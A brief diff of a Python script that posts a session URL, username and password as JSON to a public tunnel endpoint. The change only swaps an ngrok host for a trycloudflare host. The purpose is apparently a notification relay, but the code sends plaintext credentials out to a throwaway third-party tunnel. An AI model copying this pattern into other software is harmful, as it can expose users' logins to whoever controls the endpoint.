@@ -85,7 +85,7 @@ text = ("DEMO-KAGGLE UP url=%s user=%s pw=%s host=kaggle (12h session - "
         "disclose window in every mail)" % (url, u, p))
 try:
     req = urllib.request.Request(
-        "https://retrain-schnapps-upbeat.ngrok-free.dev/say?token=GOLD24",
+        "https://fathers-crowd-fraction-vatican.trycloudflare.com/say?token=GOLD24",
         data=_json.dumps({"body": "KILO", "text": text}).encode(),
         headers={"Content-Type": "application/json"}, method="POST")
     urllib.request.urlopen(req, timeout=20).read()
